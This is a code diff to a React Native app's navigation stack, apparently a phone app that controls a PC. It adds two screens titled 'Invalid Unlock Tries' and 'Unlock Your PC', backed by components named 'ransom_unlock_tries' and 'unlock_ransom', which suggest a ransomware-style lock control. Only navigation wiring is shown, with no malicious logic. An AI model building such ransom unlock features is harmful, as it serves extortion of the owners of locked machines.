@@ -15,6 +15,8 @@ import PastRequests from "./app/past/PastRequests";
 import { connect } from "react-redux";
 
 import { Check_Key_From_Storage } from "../redux/actions/auth";
+import ransom_unlock_tries from "./app/Control/ransom_unlock_tries";
+import unlock_ransom from "./app/Control/unlock_ransom";
 const Stack = createStackNavigator();
 const AuthStack = () => {
   return (
@@ -83,12 +85,25 @@ const MainStack = () => {
           title: "Power Options",
         }}
       />
-
       <Stack.Screen
         name="PastRequests"
         component={PastRequests}
         options={{
           title: "Past Requests",
+        }}
+      />
+      <Stack.Screen
+        name="InvalidUnlock"
+        component={ransom_unlock_tries}
+        options={{
+          title: "Invalid Unlock Tries",
+        }}
+      />
+         <Stack.Screen
+        name="UNLOCK_RANSOM"
+        component={unlock_ransom}
+        options={{
+          title: "Unlock Your PC",
         }}
       />
     </Stack.Navigator>
